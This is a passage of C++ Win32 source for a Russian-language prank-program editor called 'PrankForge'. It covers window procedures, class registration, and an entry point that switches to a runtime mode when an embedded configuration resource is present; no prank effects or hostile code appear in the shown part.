        if(nc!=hC||ns!=hS||hp!=hP){hC=nc;hS=ns;hP=hp;InvalidateRect(h,nullptr,FALSE);}
        if(nc||ns||hp>=0)SetCursor(LoadCursor(nullptr,IDC_HAND));else SetCursor(LoadCursor(nullptr,IDC_ARROW));
        return 0;}
    case WM_LBUTTONDOWN:{int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        RECT cb={rc.right-280,15,rc.right-20,55};
        auto ins=[](const RECT& r,int px,int py){return px>=r.left&&px<=r.right&&py>=r.top&&py<=r.bottom;};
        if(ins(cb,x,y)){RECT dlg={0,0,600,320};AdjustWindowRect(&dlg,WS_OVERLAPPEDWINDOW&~WS_THICKFRAME,FALSE);
            int dw=dlg.right-dlg.left,dh=dlg.bottom-dlg.top;
            int px=(GetSystemMetrics(SM_CXSCREEN)-dw)/2,py=(GetSystemMetrics(SM_CYSCREEN)-dh)/2;
            CreateWindowExW(WS_EX_DLGMODALFRAME,CLASS_CREATE,L"PrankForge — Новый проект",
                WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU,px,py,600,320,h,nullptr,g_hInst,nullptr);return 0;}
        return 0;}
    case WM_LBUTTONDBLCLK:{int x=LOWORD(l),y=HIWORD(l);RECT rc;GetClientRect(h,&rc);
        if(x>250){int yy=100;for(size_t i=0;i<g_projects.size();++i){
            RECT cd={270,yy,rc.right-20,yy+90};
            if(x>=cd.left&&x<=cd.right&&y>=cd.top&&y<=cd.bottom){OpenEditor(h,(int)i);return 0;}yy+=100;}}
        return 0;}
    case WM_DESTROY:PostQuitMessage(0);return 0;
    }
    return DefWindowProcW(h,m,w,l);
}

void OpenMainWindow(){
    RECT rc={0,0,1280,720};AdjustWindowRect(&rc,WS_OVERLAPPEDWINDOW,FALSE);
    int w=rc.right-rc.left,h=rc.bottom-rc.top;
    int x=(GetSystemMetrics(SM_CXSCREEN)-w)/2,y=(GetSystemMetrics(SM_CYSCREEN)-h)/2;
    g_mainWnd=CreateWindowExW(0,CLASS_MAIN,L"PrankForge",WS_OVERLAPPEDWINDOW,x,y,w,h,nullptr,nullptr,g_hInst,nullptr);
    ShowWindow(g_mainWnd,SW_SHOW);UpdateWindow(g_mainWnd);
}

void RegisterClasses(){
    WNDCLASSW wc={};wc.hInstance=g_hInst;wc.hCursor=LoadCursor(nullptr,IDC_ARROW);wc.hbrBackground=nullptr;
    wc.lpfnWndProc=WelcomeProc;wc.lpszClassName=CLASS_WELCOME;wc.style=CS_DBLCLKS;RegisterClassW(&wc);
    wc.lpfnWndProc=MainProc;wc.lpszClassName=CLASS_MAIN;wc.style=CS_DBLCLKS;RegisterClassW(&wc);
    wc.lpfnWndProc=CreateProc;wc.lpszClassName=CLASS_CREATE;wc.style=0;RegisterClassW(&wc);
    wc.lpfnWndProc=EditorProc;wc.lpszClassName=CLASS_EDITOR;wc.style=CS_DBLCLKS;RegisterClassW(&wc);
    wc.lpfnWndProc=EffectSelProc;wc.lpszClassName=CLASS_EFFECTSEL;wc.style=0;RegisterClassW(&wc);
}

// ============================================================
// ТОЧКА ВХОДА
// ============================================================
int WINAPI wWinMain(HINSTANCE hInst,HINSTANCE,LPWSTR,int){
    g_hInst=hInst;

    // === Режим RUNTIME? ===
    HRSRC hRes=FindResourceW(nullptr,L"PRANK_CONFIG",RT_RCDATA);
    if(hRes){
        return RunAsRuntime();
    }

    // === Режим редактора ===
    HANDLE hM=CreateMutexW(nullptr,TRUE,L"PrankForgeMutex_v1");
    if(GetLastError()==ERROR_ALREADY_EXISTS){
        MessageBoxW(nullptr,L"PrankForge уже запущен.",L"PrankForge",MB_OK);return 0;
    }
    SetProcessDPIAware();
    RegisterClasses();

    RECT rc={0,0,700,540};
    AdjustWindowRect(&rc,WS_OVERLAPPEDWINDOW&~WS_THICKFRAME&~WS_MAXIMIZEBOX,FALSE);
    int w=rc.right-rc.left,h=rc.bottom-rc.top;
    int x=(GetSystemMetrics(SM_CXSCREEN)-w)/2,y=(GetSystemMetrics(SM_CYSCREEN)-h)/2;
    HWND welcome=CreateWindowExW(0,CLASS_WELCOME,L"PrankForge — Добро пожаловать",
        WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU,x,y,700,540,nullptr,nullptr,hInst,nullptr);
    ShowWindow(welcome,SW_SHOW);UpdateWindow(welcome);

    MSG msg;
    while(GetMessageW(&msg,nullptr,0,0)){TranslateMessage(&msg);DispatchMessageW(&msg);}
    if(hM){ReleaseMutex(hM);CloseHandle(hM);}
    return 0;
}
